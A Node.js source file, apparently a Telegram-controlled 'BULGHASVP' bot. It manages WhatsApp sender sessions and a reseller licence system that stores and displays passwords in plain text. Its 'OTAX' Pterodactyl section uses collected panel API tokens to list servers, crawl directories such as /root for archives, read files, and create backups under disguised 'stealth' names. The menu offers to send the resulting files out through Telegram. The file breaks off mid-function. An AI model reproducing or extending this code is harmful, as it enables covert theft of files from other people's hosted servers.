const { Telegraf } = require("telegraf");
const fs = require('fs');
const fsPromises = require('fs').promises;
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const os = require('os');
const pLimit = require('p-limit');
const bodyParser = require("body-parser");
const moment = require('moment-timezone');
const { exec } = require("child_process");
const config = require("./config.js");
const tokens = config.tokens;
const bot = new Telegraf(tokens);
const axios = require("axios");
const { Server } = require("socket.io");
const http = require("http");
const OwnerId = config.owner;
const VPS = config.ipvps;
const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./auth";
const PORT = config.port;
const file = "./akses.json";
const { getUsers, saveUsers } = require("./database/userStore.js");

const express = require('express');
const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*"
  }
});
const cookieParser = require("cookie-parser");
app.use(cookieParser());

// Global variables for online and active users
let onlineUsers = new Set();
let activeSenders = new Set();

const USAGE_LIMIT_FILE = "./database/usageLimit.json";
const CHAT_FILE = path.join(__dirname, "./database/chatHistory.json");

// Ensure files exist
if (!fs.existsSync(CHAT_FILE)) fs.writeFileSync(CHAT_FILE, JSON.stringify([]));
if (!fs.existsSync(file)) fs.writeFileSync(file, JSON.stringify({ owners: [], akses: [] }, null, 2));
if (!fs.existsSync(USAGE_LIMIT_FILE)) fs.writeFileSync(USAGE_LIMIT_FILE, JSON.stringify({}));

// Helper Chat History Functions
function loadChatHistory() {
  try {
    return JSON.parse(fs.readFileSync(CHAT_FILE));
  } catch {
    return [];
  }
}

function saveChatHistory(messages) {
  fs.writeFileSync(CHAT_FILE, JSON.stringify(messages, null, 2));
}

// Status Dashboard Function
function updateDashboardStatus() {
  const activeList = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
  io.emit("statusUpdate", {
    onlineUsers: onlineUsers.size,
    activeSender: activeList.length,
  });
}

// Usage Limits
function getUsageLimit() {
  try {
    if (fs.existsSync(USAGE_LIMIT_FILE)) {
      return JSON.parse(fs.readFileSync(USAGE_LIMIT_FILE, "utf-8"));
    }
  } catch (e) {
    console.error("Error loading usage limit:", e);
  }
  return {};
}

function saveUsageLimit(data) {
  try {
    fs.writeFileSync(USAGE_LIMIT_FILE, JSON.stringify(data, null, 2));
  } catch (e) {
    console.error("Error saving usage limit:", e);
  }
}

// Access control functions
function loadAkses() {
  try {
    if (!fs.existsSync(file)) fs.writeFileSync(file, JSON.stringify({ owners: [], akses: [] }, null, 2));
    return JSON.parse(fs.readFileSync(file));
  } catch (e) {
    return { owners: [], akses: [] };
  }
}

function saveAkses(data) {
  try {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
  } catch (e) {
    console.error("Error saving akses:", e);
  }
}

function isOwner(id) {
  const data = loadAkses();
  const allOwners = [config.owner.toString(), ...data.owners.map(x => x.toString())];
  return allOwners.includes(id.toString());
}

function isAdmin(userId) {
  const users = getUsers();
  const user = users.find(u => u.telegram_id === userId);
  return user && (user.role === "admin" || user.role === "owner");
}

function isReseller(userId) {
  const users = getUsers();
  const user = users.find(u => u.telegram_id === userId);
  return user && (user.role === "reseller" || user.role === "owner");
}

function isAuthorized(id) {
  const data = loadAkses();
  return isOwner(id) || data.akses.includes(id);
}

// Key generator and helper
function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  let key = "";
  for (let i = 0; i < length; i++) {
    key += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return key;
}

function parseDuration(str) {
  const match = str.match(/^(d+)([dh])$/);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2];
  return unit === "d" ? value * 24 * 60 * 60 * 1000 : value * 60 * 60 * 1000;
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Baileys imports and WhatsApp session helpers
const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
} = require('@whiskeysockets/baileys');

const saveActive = (BotNumber) => {
  const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
  if (!list.includes(BotNumber)) {
    list.push(BotNumber);
    fs.writeFileSync(file_session, JSON.stringify(list));
  }
};

const sessionPath = (BotNumber) => {
  const dir = path.join(sessions_dir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

const removeActive = (BotNumber) => {
  if (!fs.existsSync(file_session)) return;
  const list = JSON.parse(fs.readFileSync(file_session));
  const newList = list.filter(num => num !== BotNumber);
  fs.writeFileSync(file_session, JSON.stringify(newList));
};

const initializeWhatsAppConnections = async () => {
  if (!fs.existsSync(file_session)) return;
  const activeNumbers = JSON.parse(fs.readFileSync(file_session));

  console.log(chalk.blue(`
┌──────────────────────────────┐
│ Ditemukan sesi WhatsApp aktif
├──────────────────────────────┤
│ Jumlah : ${activeNumbers.length}
└──────────────────────────────┘`));

  for (const BotNumber of activeNumbers) {
    console.log(chalk.green(`Menghubungkan: ${BotNumber}`));
    const sessionDir = sessionPath(BotNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    const sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      defaultQueryTimeoutMs: undefined,
    });

    sessions.set(BotNumber, sock);

    sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
      if (connection === "open") {
        console.log(`✅ Bot ${BotNumber} terhubung!`);
        sessions.set(BotNumber, sock);
      } else if (connection === "close") {
        const reason = lastDisconnect?.error?.output?.statusCode;
        console.log(`❌ Bot ${BotNumber} terputus (kode: ${reason || "unknown"})`);
        sessions.delete(BotNumber);
        if (reason !== DisconnectReason.loggedOut) {
          console.log(`🔁 Reconnecting ${BotNumber}...`);
          await connectToWhatsApp(BotNumber);
        } else {
          removeActive(BotNumber);
        }
      }
    });

    sock.ev.on("creds.update", saveCreds);
  }
};

const connectToWhatsApp = async (BotNumber, chatId, ctx) => {
  const sessionDir = sessionPath(BotNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  let statusMessage = await ctx.reply(`Pairing dengan nomor *${BotNumber}*...`, { parse_mode: "Markdown" });

  const editStatus = async (text) => {
    try {
      await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, { parse_mode: "Markdown" });
    } catch (e) {
      console.error("Gagal edit pesan:", e.message);
    }
  };

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  let isConnected = false;

  sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;

      if (code >= 500 && code < 600) {
        await editStatus(makeStatus(BotNumber, "Menghubungkan ulang..."));
        return await connectToWhatsApp(BotNumber, chatId, ctx);
      }

      if (!isConnected) {
        await editStatus(makeStatus(BotNumber, "❌ Gagal terhubung."));
        removeActive(BotNumber);
        fs.rmSync(sessionDir, { recursive: true, force: true });
      }
    }

    if (connection === "open") {
      isConnected = true;
      sessions.set(BotNumber, sock);
      saveActive(BotNumber);
      await editStatus(makeStatus(BotNumber, "✅ Berhasil terhubung."));
    }

    if (connection === "connecting") {
      await sleep(1000);
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(BotNumber);
          const formatted = code.match(/.{1,4}/g)?.join("-") || code;

          const codeData = makeCode(BotNumber, formatted);
          await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, codeData.text, {
            parse_mode: "Markdown",
            reply_markup: codeData.reply_markup
          });
        }
      } catch (err) {
        console.error("Error requesting code:", err);
        await editStatus(makeStatus(BotNumber, `❗ ${err.message}`));
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);
  return sock;
};

const makeStatus = (number, status) => `\`\`\`
┌───────────────────────────┐
│ STATUS │ ${status.toUpperCase()}
├───────────────────────────┤
│ Nomor : ${number}
└───────────────────────────┘
\`\`\``;

const makeCode = (number, code) => ({
  text: `\`\`\`
┌───────────────────────────┐
│ STATUS │ SEDANG PAIR
├───────────────────────────┤
│ Nomor : ${number}
│ Kode  : ${code}
└───────────────────────────┘
\`\`\``,
  parse_mode: "Markdown",
  reply_markup: {
    inline_keyboard: [
      [{ text: "!! 𝐒𝐚𝐥𝐢𝐧°𝐂𝐨𝐝𝐞 !!", callback_data: `salin|${code}` }]
    ]
  }
});

// BOT Initialization and commands

console.clear();
console.log(chalk.magenta(`
⣿⡿⠿⢿⣷⣶⣤⡀⢀⣤⣶⣾⣿⠿⠿⣿⣷⣶⣶⣤⣄⣀⡀
⠉⠁⢀⣾⣿⣭⣍⡛⠻⠟⠋⠉⠙⠻⠿⠛⠛⠉⠉⠙⠻⠿⠋
⢀⣾⡿⠋⠁⠀⠈⠙⠛⠶⣶⣤⣄⡀⠀⠀⠀⠀⢀⣠⡾⠃⠀
⠸⣿⣧⣀⣤⣴⣶⣶⣶⣦⣤⣈⣉⠛⠛⠛⠛⠛⠛⠋⠀⠀⠀
⠀⠈⠻⢿⣿⣿⡿⠿⠿⠿⠿⠿⠟⠛⠉⠉⠁⠀⠀⠀⠀⠀⠀
⠀⠈⠙⠛⠛⠓⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢀⡤⠤⠤⠤⢤⣀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣤⣤⣀
⣶⣿⣯⣭⣽⣿⣿⣿⣷⣶⣤⣄⡀⢀⣤⣾⣿⣿⣿⣯⣭⣿⣿
⠘⠿⠿⠛⠉⠉⠉⠛⠛⠿⣿⣿⣿⠿⠛⠋⠉⠉⠉⠉⠉⠙⠋
𝔇𝔢𝔰𝔱𝔯𝔬𝔶 𝔱𝔥𝔢 𝔫𝔬𝔯𝔪. 𝔅𝔢𝔠𝔬𝔪𝔢 𝔲𝔫𝔯𝔢𝔞𝔩.⠀
`));

bot.launch();
console.log(chalk.red(`
╔══════════════════════════════════════╗
║   ${chalk.bgBlackBright.bold(' BULGHASVP - System Aktif  ')}.  ║
╠══════════════════════════════════════╣
║   ${chalk.cyanBright('ID OWNER')}   : ${chalk.yellowBright(OwnerId)}        
║   ${chalk.magentaBright('STATUS')}     : ${chalk.greenBright('BOT CONNECTED ✅')} 
╚══════════════════════════════════════╝
`));

initializeWhatsAppConnections();


// Start command handler
bot.start((ctx) => {
  const name = ctx.from.first_name || "User";

  const message = `
👾 BULGHASVP Control Center  
[ ACCESS: GRANTED | SYSTEM ONLINE ]

━━━━━━━━━━━━━━━━━━━
👤 USER MANAGEMENT
━━━━━━━━━━━━━━━━━━━
/adduser   → Create New User  
/edituser  → Edit Existing User  
/extend    → Extend User Expiry  
/deluser   → Delete User  
/listuser  → Show Active Users  

━━━━━━━━━━━━━━━━━━━
🏷 ROLE & ACCESS
━━━━━━━━━━━━━━━━━━━
/address   → Create Reseller  
/addadmin  → Grant Admin Access  
/addowner  → Promote to Owner  

━━━━━━━━━━━━━━━━━━━
🔗 SESSION CONTROL
━━━━━━━━━━━━━━━━━━━
/connect    → Bind Bot Session  
/listsender → Show Active Senders  
/delsender  → Purge Sender Session  

━━━━━━━━━━━━━━━━━━━
⚙️ PANEL CONTROL (OWNER)
━━━━━━━━━━━━━━━━━━━
/cadp     → Set Panel Credentials  
/adplist  → List All Panels  
/deladp   → Delete Panel  
/adp      → Auto Pair Sessions  
/adpfile  → Backup & Send Files  

━━━━━━━━━━━━━━━━━━━
📡 Grid Link Established  
⚡ Execute Commands with Precision
`;

  ctx.replyWithMarkdown(message, {
    disable_web_page_preview: true,
    reply_markup: {
      inline_keyboard: [
        [
          { text: "Contact Admin", url: "https://t.me/ghaofficial" }
        ]
      ]
    }
  });
});


// Connect command
bot.command("connect", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId)) return ctx.reply("Hanya owner yang bisa menambahkan sender.");
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return await ctx.reply("Masukkan nomor WA: `/connect 62xxxx`", { parse_mode: "Markdown" });
  }

  const BotNumber = args[1];
  if (sessions.has(BotNumber)) {
    return ctx.reply(`Sesi untuk nomor ${BotNumber} sudah aktif.`);
  }
  await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
});

// listsender command
bot.command("listsender", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("Perintah ini hanya untuk Owner.");
  if (sessions.size === 0) return ctx.reply("Tidak ada sender aktif.");
  const list = [...sessions.keys()].map(n => `• ${n}`).join("");
  ctx.reply(`*Daftar Sender Aktif:*
${list}`, { parse_mode: "Markdown" });
});

// delsander command
bot.command("delsender", async (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("Perintah ini hanya untuk Owner.");
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Contoh: /delsender 628xxxx");

  const number = args[1];
  const sock = sessions.get(number);

  if (!sock) return ctx.reply("Sender tidak ditemukan atau tidak aktif.");

  try {
    await sock.logout();
    console.log(`Logged out ${number}`);
  } catch (err) {
    console.error(`Error during logout for ${number}:`, err);
    sock.end();
  }

  sessions.delete(number);
  const sessionDir = sessionPath(number);
  fs.rmSync(sessionDir, { recursive: true, force: true });
  removeActive(number);
  
  ctx.reply(`Sender ${number} berhasil dihapus dan sesi dibersihkan.`);
});


// User Management Commands

bot.command("adduser", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isReseller(userId) && !isAdmin(userId) && !isOwner(userId)) {
    return ctx.reply("❌ Hanya Owner, Admin, atau Reseller yang bisa menambah user.");
  }

  if (args.length !== 4) {
    return ctx.reply("Format: /adduser username password durasi(hari)");
  }

  const [_, username, password, durasi] = args;
  const users = getUsers();

  if (users.find(u => u.username === username)) {
    return ctx.reply("❌ Username sudah terdaftar.");
  }

  const expired = Date.now() + parseInt(durasi) * 86400000;
  users.push({ username, password, expired, role: "user" });
  saveUsers(users);
  
  const functionCode = `
🧬 WEB LOGIN : http://${VPS}:${PORT}`;
  
  return ctx.reply(
    `✅ User berhasil ditambahkan:
👤 *${username}*
🔑 *${password}*
📅 Exp: ${new Date(expired).toLocaleString("id-ID")}${functionCode}`,
    { parse_mode: "Markdown" }
  );
});

bot.command("deluser", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isReseller(userId) && !isAdmin(userId) && !isOwner(userId)) {
    return ctx.reply("❌ Hanya Owner yang bisa menghapus user.");
  }

  if (args.length !== 2) {
    return ctx.reply("Format: /deluser username");
  }

  const username = args[1];
  const users = getUsers();
  const index = users.findIndex(u => u.username === username);

  if (index === -1) return ctx.reply("❌ Username tidak ditemukan.");
  if (users[index].role === "admin" && !isAdmin(userId)) {
    return ctx.reply("❌ Reseller tidak bisa menghapus user Admin.");
  }

  users.splice(index, 1);
  saveUsers(users);
  return ctx.reply(`🗑️ User *${username}* berhasil dihapus.`, { parse_mode: "Markdown" });
});

bot.command("addowner", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isOwner(userId)) return ctx.reply("❌ Hanya owner yang bisa menambahkan OWNER.");
  if (args.length !== 4) return ctx.reply("Format: /addowner Username Password Durasi");

  const [_, username, password, durasi] = args;
  const users = getUsers();

  if (users.find(u => u.username === username)) {
    return ctx.reply(`❌ Username *${username}* sudah terdaftar.`, { parse_mode: "Markdown" });
  }

  const expired = Date.now() + parseInt(durasi) * 86400000;
  users.push({ username, password, expired, role: "owner" });
  saveUsers(users);

  const functionCode = `
🧬 WEB LOGIN : http://${VPS}:${PORT}`;
  
  return ctx.reply(
    `✅ Owner berhasil ditambahkan:
👤 *${username}*
🔑 *${password}*
📅 Exp: ${new Date(expired).toLocaleString("id-ID")}
${functionCode}`,
    { parse_mode: "Markdown" }
  );
});

bot.command("delowner", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isOwner(userId)) return ctx.reply("❌ Hanya owner yang bisa menghapus OWNER.");
  if (args.length !== 2) return ctx.reply("Format: /delowner username");

  const username = args[1];
  const users = getUsers();
  const index = users.findIndex(u => u.username === username && u.role === "owner");

  if (index === -1) {
    return ctx.reply(`❌ Username *${username}* tidak ditemukan atau bukan owner.`, { parse_mode: "Markdown" });
  }

  users.splice(index, 1);
  saveUsers(users);
  return ctx.reply(`🗑️ Owner *${username}* berhasil dihapus.`, { parse_mode: "Markdown" });
});

bot.command("address", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isOwner(userId) && !isAdmin(userId)) return ctx.reply("❌ Hanya Admin yang bisa menambahkan Reseller.");
  if (args.length !== 4) return ctx.reply("Format: /address Username Password Durasi");

  const [_, username, password, durasi] = args;
  const users = getUsers();

  if (users.find(u => u.username === username)) {
    return ctx.reply(`❌ Username *${username}* sudah terdaftar.`, { parse_mode: "Markdown" });
  }

  const expired = Date.now() + parseInt(durasi) * 86400000;
  users.push({ username, password, expired, role: "reseller" });
  saveUsers(users);

  const functionCode = `
🧬 WEB LOGIN : http://${VPS}:${PORT}`;
  
  return ctx.reply(
    `✅ Reseller berhasil ditambahkan:
👤 *${username}*
🔑 *${password}*
📅 Exp: ${new Date(expired).toLocaleString("id-ID")}
${functionCode}`,
    { parse_mode: "Markdown" }
  );
});

bot.command("delress", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isOwner(userId) && !isAdmin(userId)) return ctx.reply("❌ Hanya Admin yang bisa menghapus Reseller.");
  if (args.length !== 2) return ctx.reply("Format: /delress username");

  const username = args[1];
  const users = getUsers();
  const index = users.findIndex(u => u.username === username);

  if (index === -1) return ctx.reply(`❌ Username *${username}* tidak ditemukan.`, { parse_mode: "Markdown" });
  if (users[index].role !== "reseller") return ctx.reply(`⚠️ *${username}* bukan reseller.`, { parse_mode: "Markdown" });

  users.splice(index, 1);
  saveUsers(users);
  return ctx.reply(`🗑️ Reseller *${username}* berhasil dihapus.`, { parse_mode: "Markdown" });
});

bot.command("addadmin", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isOwner(userId)) {
    return ctx.reply("❌ Hanya Owner yang bisa menambahkan Admin.");
  }

  if (args.length !== 4) {
    return ctx.reply("Format: /addadmin Username Password Durasi");
  }

  const [_, username, password, durasi] = args;
  const users = getUsers();

  if (users.find(u => u.username === username)) {
    return ctx.reply(`❌ Username *${username}* sudah terdaftar.`, { parse_mode: "Markdown" });
  }

  const expired = Date.now() + parseInt(durasi) * 86400000;
  users.push({
    username,
    password,
    expired,
    role: "admin",
    telegram_id: userId
  });

  saveUsers(users);

  const functionCode = `
🧬 WEB LOGIN : http://${VPS}:${PORT}`;

  return ctx.reply(
    `✅ Admin berhasil ditambahkan:
👤 *${username}*
🔑 *${password}*
📅 Exp: ${new Date(expired).toLocaleString("id-ID")}
${functionCode}`,
    { parse_mode: "Markdown" }
  );
});

bot.command("deladmin", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isOwner(userId)) {
    return ctx.reply("❌ Hanya Owner yang bisa menghapus Admin.");
  }

  if (args.length !== 2) {
    return ctx.reply("Format: /deladmin <username>");
  }

  const username = args[1];
  let users = getUsers();
  const target = users.find(u => u.username === username && u.role === "admin");

  if (!target) {
    return ctx.reply(`❌ Admin *${username}* tidak ditemukan.`, { parse_mode: "Markdown" });
  }

  users = users.filter(u => u.username !== username);
  saveUsers(users);

  return ctx.reply(`🗑️ Admin *${username}* berhasil dihapus.`, { parse_mode: "Markdown" });
});


// The fixed and complete /edituser command
bot.command("edituser", (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(" ");

  if (!isReseller(userId) && !isAdmin(userId) && !isOwner(userId)) {
    return ctx.reply("❌ Hanya Reseller/Admin/Owner yang bisa mengedit user.");
  }

  if (args.length !== 5) {
    return ctx.reply("Format: /edituser Username Password Durasi Role");
  }

  const [_, username, password, durasi, role] = args;

  const users = getUsers();
  const index = users.findIndex(u => u.username === username);

  if (index === -1) {
    return ctx.reply(`❌ Username *${username}* tidak ditemukan.`, { parse_mode: "Markdown" });
  }

  const roleLower = role.toLowerCase();
  if (!["user", "reseller", "admin", "owner"].includes(roleLower)) {
    return ctx.reply(`⚠️ Role hanya bisa: user, reseller, admin, owner.`, { parse_mode: "Markdown" });
  }

  if (roleLower === "owner" && !isOwner(userId)) {
    return ctx.reply("❌ Kamu bukan owner, tidak bisa membuat user role owner.");
  }

  if (roleLower === "admin" && !isAdmin(userId) && !isOwner(userId)) {
    return ctx.reply("❌ Hanya Owner/Admin yang bisa membuat/mengubah user role admin.");
  }

  // Update user data
  users[index].password = password;
  users[index].expired = Date.now() + parseInt(durasi) * 86400000;
  users[index].role = roleLower;

  saveUsers(users);

  return ctx.reply(
    `✅ User *${username}* berhasil diupdate:
🔑 Password: *${password}*
📅 Exp: ${new Date(users[index].expired).toLocaleString("id-ID")}
🎖️ Role: *${roleLower}*`,
    { parse_mode: "Markdown" }
  );
});


// LIST USER Command
bot.command("listuser", (ctx) => {
  const userId = ctx.from.id;
  if (!isReseller(userId) && !isAdmin(userId) && !isOwner(userId)) {
    return ctx.reply("❌ Hanya Reseller/Admin yang bisa menggunakan perintah ini.");
  }

  const users = getUsers();
  const isOwnerUser = isOwner(userId);

  let text = `📋 Daftar Pengguna:

`;
  users.forEach((user) => {
    // Regular users cannot see owners or admins unless owner themselves
    if (!isOwnerUser && (user.role === "admin" || user.role === "owner")) return;
    text += `👤 *${user.username}*
🔑 ${user.password}
📅 Exp: ${new Date(user.expired).toLocaleString("id-ID")}
🎖️ Role: ${user.role}

`;
  });

  return ctx.reply(text.trim(), { parse_mode: "Markdown" });
});


// =====================================
// 🔹 OTAX - PTERODACTYL INTEGRATION
// =====================================
// ADP storage
const ADP_FILE = path.join(__dirname, './database/adp.json');

function loadADP() {
  if (!fs.existsSync(ADP_FILE)) {
    try {
      fs.mkdirSync(path.dirname(ADP_FILE), { recursive: true });
    } catch {}
    fs.writeFileSync(ADP_FILE, JSON.stringify({}));
  }
  return JSON.parse(fs.readFileSync(ADP_FILE, 'utf8') || '{}');
}

function saveADP(data) {
  fs.writeFileSync(ADP_FILE, JSON.stringify(data, null, 2), 'utf8');
}

// Helper functions for formatting replies (code blocks)
const okBox = (lines) => '```' + (Array.isArray(lines) ? lines.join('\n') : String(lines)) + '```';
const errBox = (lines) => '```' + (Array.isArray(lines) ? lines.join('\n') : String(lines)) + '```';

// Pterodactyl API helpers
const baseUrl = (d) => {
  let url = String(d).trim();
  if (!/^https?:\/\//i.test(url)) url = `https://${url}`;
  return url.replace(/\/+$/, '');
};
const isPtlc = (s) => /^ptlc/i.test(String(s || '')); // token client prefix
const isPtla = (s) => /^ptla/i.test(String(s || '')); // token app prefix

const OTAX_HTTP = axios;
const OTAX_IGNORE = [
  'node_modules',
  '**/node_modules/**',
  'package-lock.json',
  '**/package-lock.json'
].join('\n');

const OTAX_STARTS = ['/home/container', '/', '/home', '/container', '/root'];
const OTAX_ARCHIVE_RE = /\.(zip|tar|tgz|tar\.gz|gz|7z|rar|xz|bz2)$/i;
const OTAX_BKP_TIMEOUT = 5 * 60 * 1000; // 5 minutes
const OTAX_BKP_POLL = 2000;
const OTAX_DL_TIMEOUT = 3 * 60 * 1000; // 3 minutes

// Wrap text into Markdown code block but neutralize internal ``` to avoid breakage
const OTAX_codeWrap = (s) =>
  '```' + String(s || '').replace(/```/g, '` ` `') + '```';

const OTAX_sendCode = (chatId, s) =>
  bot.telegram.sendMessage(chatId, OTAX_codeWrap(s), { parse_mode: 'Markdown' });

const OTAX_httpGetTO = (url, token, params = {}) =>
  OTAX_HTTP.get(url, {
    headers: token ? { Authorization: `Bearer ${token}` } : {},
    params,
    timeout: 15000,
    validateStatus: (s) => s >= 200 && s < 500,
  });

const OTAX_httpGetBinTO = (url, token, params = {}) =>
  OTAX_HTTP.get(url, {
    headers: token ? { Authorization: `Bearer ${token}` } : {},
    params,
    responseType: 'arraybuffer',
    timeout: 15000,
    validateStatus: (s) => s >= 200 && s < 500,
  });

const OTAX_norm = (p) => String(p || '/').replace(/\/+/g, '/');
const OTAX_stealth = () =>
  `cache_${Date.now().toString(36)}_${Math.random().toString(36).slice(2, 8)}`;

const OTAX_extFromUrl = (u) => {
  u = String(u || '');
  if (/\.(zip)(?:$|\?)/i.test(u)) return 'zip';
  if (/\.(tar\.gz|tgz)(?:$|\?)/i.test(u)) return 'tar.gz';
  if (/\.(7z)(?:$|\?)/i.test(u)) return '7z';
  if (/\.(rar)(?:$|\?)/i.test(u)) return 'rar';
  if (/\.(gz)(?:$|\?)/i.test(u)) return 'gz';
  if (/\.(xz)(?:$|\?)/i.test(u)) return 'xz';
  if (/\.(bz2)(?:$|\?)/i.test(u)) return 'bz2';
  return 'tar.gz';
};

function OTAX_pick(v, ...k) {
  for (const x of k) {
    if (v && v[x] != null) return v[x];
  }
  return undefined;
}

// List servers fallback with both API tokens support
async function listServersWithFallback(base, ptlc, ptla) {
  let servers = [];

  // try client token (ptlc)
  if (isPtlc(ptlc)) {
    try {
      const r = await OTAX_httpGetTO(`${base}/api/client`, ptlc);
      if (r.status === 200 && Array.isArray(r.data?.data)) {
        servers = r.data.data.map((s) => s.attributes || s);
      }
    } catch (e) {
      console.error('Error fetching servers with ptlc:', e?.message || e);
    }
  }

  // fallback to application token (ptla)
  if (!servers.length && isPtla(ptla)) {
    try {
      const r = await OTAX_httpGetTO(`${base}/api/application/servers`, ptla);
      if (r.status === 200 && Array.isArray(r.data?.data)) {
        servers = r.data.data.map((s) => {
          const attrs = s.attributes || {};
          // ensure identifier becomes a stable id
          const id = OTAX_pick(attrs, 'identifier', 'id', 'uuid') || s.id || s.identifier;
          return { ...attrs, id, name: attrs.name || s.name || id };
        });
      }
    } catch (e) {
      console.error('Error fetching servers with ptla:', e?.message || e);
    }
  }

  // normalize output to minimal shape
  return servers.map((s) => ({
    id: s.id || s.identifier || s.identifier || s.uuid || s.attributes?.identifier || s.attributes?.id,
    name: s.name || s.id || s.identifier || '',
  }));
}

// List directory contents from Pterodactyl API (client or app)
async function OTAX_listDirClient(base, token, sid, dir) {
  const r = await OTAX_httpGetTO(`${base}/api/client/servers/${sid}/files/list`, token, {
    directory: dir,
  });
  const arr = Array.isArray(r.data?.data) ? r.data.data.map((x) => x.attributes || x) : [];
  return arr.map((it) => ({
    name: String(it.name || '').trim(),
    isFile: !!(it.is_file ?? it.isFile ?? it.object === 'file_object'),
    isDir:
      (it.is_file === false) ||
      it.type === 'directory' ||
      it.directory === true ||
      it.is_directory === true ||
      it.object === 'directory',
    parent: dir,
  }));
}

async function OTAX_listDirSafe(base, ptlc, ptla, sid, dir) {
  dir = OTAX_norm(dir || '/');
  if (isPtlc(ptlc)) {
    try {
      return await OTAX_listDirClient(base, ptlc, sid, dir);
    } catch {}
  }
  if (isPtla(ptla)) {
    try {
      return await OTAX_listDirClient(base, ptla, sid, dir);
    } catch {}
  }
  return [];
}

// Read file contents as binary buffer from Pterodactyl API
async function OTAX_readFileBinary(base, ptla, ptlc, sid, filePath) {
  const qp = { file: filePath };
  if (isPtla(ptla)) {
    try {
      const r = await OTAX_httpGetBinTO(
        `${base}/api/application/servers/${sid}/files/contents`,
        ptla,
        qp
      );
      if (r.status === 200) return Buffer.from(r.data);
    } catch {}
  }
  if (isPtlc(ptlc)) {
    try {
      const r = await OTAX_httpGetBinTO(
        `${base}/api/client/servers/${sid}/files/contents`,
        ptlc,
        qp
      );
      if (r.status === 200) return Buffer.from(r.data);
    } catch {}
  }
  throw new Error('read_failed');
}

// Search for existing archives under starting directories, with limits
async function OTAX_findExistingArchives(
  base,
  ptlc,
  ptla,
  sid,
  maxDepth = 2,
  maxDirs = 200,
  maxFound = 10
) {
  const q = [...new Set(OTAX_STARTS.map(OTAX_norm))];
  const seen = new Set(q);
  const found = [];
  let depth = 0,
    expanded = 0;

  while (q.length && depth <= maxDepth && expanded < maxDirs && found.length < maxFound) {
    const level = q.length;
    for (let i = 0; i < level && expanded < maxDirs && found.length < maxFound; i++) {
      const dir = q.shift();
      expanded++;
      let items = [];
      try {
        items = await OTAX_listDirSafe(base, ptlc, ptla, sid, dir);
      } catch {}
      for (const it of items) {
        const name = it.name;
        if (!name || name === '.' || name === '..') continue;
        const full = OTAX_norm(`${it.parent || dir}/${name}`);
        if (it.isFile && OTAX_ARCHIVE_RE.test(name)) {
          found.push(full);
          if (found.length >= maxFound) break;
          continue;
        }
        if (it.isDir && !/^node_modules$/i.test(name)) {
          if (!seen.has(full)) {
            seen.add(full);
            q.push(full);
          }
        }
      }
    }
    depth++;
  }
  return found;
}

// Create a backup on the Pterodactyl server
async function OTAX_createBackup(base, ptlc, sid, ignored) {
  const r = await OTAX_HTTP.post(
    `${base}/api/client/servers/${sid}/backups`,
    { name: OTAX_stealth(), ignored, is_locked: false },
    { headers: { Authorization: `Bearer ${ptlc}` }, timeout: 15000, validateStatus: (s) => s >= 200 && s < 500 }
  );
  const a = r.data?.attributes || r.data?.data?.attributes || {};
  const uuid = OTAX_pick(a, 'uuid', 'identifier', 'id');
  if (!uuid) throw new Error('backup_create_failed');
  return uuid;
}

// Poll backup status until ready or timeout
async function OTAX_waitBackupReady(base, ptlc, sid, uuid, maxMs = OTAX_BKP_TIMEOUT) {
  const start = Date.now();
  await sleep(800);
  while (true) {
    const r = await OTAX_HTTP.get(
      `${base}/api/client/servers/${sid}/backups/${uuid}`,
      { headers: { Authorization: `Bearer ${ptlc}` }, timeout: 12000, validateStatus: (s) => s >= 200 && s < 500 }
    );
    const a = r.data?.attributes || r.data?.data?.attributes || {};
    const ok = a.is_successful === true || !!(a.completed_at || a.completedAt);
